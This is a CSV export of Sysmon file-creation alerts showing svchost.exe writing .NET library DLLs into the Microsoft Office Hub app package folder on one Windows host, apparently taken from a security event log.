"2025-12-26 11:29:12.167 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175147,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Channels.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.164 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.164","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.167 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175148,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.164 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.164","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.167 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175149,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Overlapped.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.164 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.164","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.167 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175150,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Tasks.Dataflow.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.164 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.164","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.167 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175151,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Tasks.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.166 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.166","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.168 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175152,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Tasks.Extensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.166 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.166","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.168 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175153,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Tasks.Parallel.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.166 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.166","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.168 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175154,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Thread.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.166 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.168","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.169 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175155,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.ThreadPool.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.168 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.168","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.169 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175156,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Threading.Timer.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.168 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.168","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.170 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175157,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Transactions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.168 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.170","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.171 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175158,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Transactions.Local.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.170 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.170","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.171 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175159,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ValueTuple.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.170 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.170","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.172 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175160,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Web.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.170 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.172","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.174 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175161,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Web.HttpUtility.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.172 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.172","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.175 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175162,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Windows.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.174 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.174","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.175 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175163,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.174 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.174","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.176 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175164,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.Linq.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.174 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.174","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.176 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175165,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.ReaderWriter.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.176 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.176","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.177 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175166,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.Serialization.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.176 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.176","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.178 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175167,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.XDocument.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.176 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.176","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.178 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175168,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.XmlDocument.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.178 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.178","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.179 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175169,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.XmlSerializer.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.178 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.178","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.180 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175170,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.XPath.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.178 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.178","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.180 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175171,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Xml.XPath.XDocument.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.180 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.180","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.181 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175172,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\WindowsBase.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.180 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.180","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.182 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175173,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\sqlite3.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.182 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.182","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.183 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175174,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.ClientModel.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.182 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.182","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.183 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175175,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Configuration.ConfigurationManager.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.182 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.182","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.184 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175176,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Diagnostics.DiagnosticSource.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.182 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.184","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.185 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175177,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Diagnostics.EventLog.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.184 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.184","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.186 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175178,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Drawing.Common.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.184 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.186","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.187 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175179,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.IO.Pipelines.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.186 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.186","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.188 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175180,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Memory.Data.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.186 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.186","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.188 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175181,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Net.ServerSentEvents.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.188 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.188","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.189 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175182,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Private.Windows.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.188 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.188","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.189 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175183,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Security.Cryptography.ProtectedData.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.188 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.188","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.190 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175184,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Text.Encodings.Web.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.188 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.190","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
